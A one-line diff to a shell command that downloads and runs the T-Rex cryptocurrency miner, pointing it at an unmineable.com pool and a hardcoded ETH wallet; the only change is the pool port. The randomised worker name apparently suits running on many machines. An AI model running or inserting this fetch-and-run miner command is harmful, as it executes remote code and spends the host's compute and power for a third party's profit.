@@ -1,3 +1,3 @@
 
-wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz && tar -xvf t-rex-0.21.6-linux.tar.gz && ./t-rex -a ethash -o ethash.unmineable.com:3333 -u  ETH:0xDDD96db7b2d3443be11a0dB03e9e326Af97E91c5.$(echo $(shuf -i 1000-9999 -n 1)-ETH)#iuow-9gb1 -p x 
+wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz && tar -xvf t-rex-0.21.6-linux.tar.gz && ./t-rex -a ethash -o ethash.unmineable.com:13333 -u  ETH:0xDDD96db7b2d3443be11a0dB03e9e326Af97E91c5.$(echo $(shuf -i 1000-9999 -n 1)-ETH)#iuow-9gb1 -p x 
 
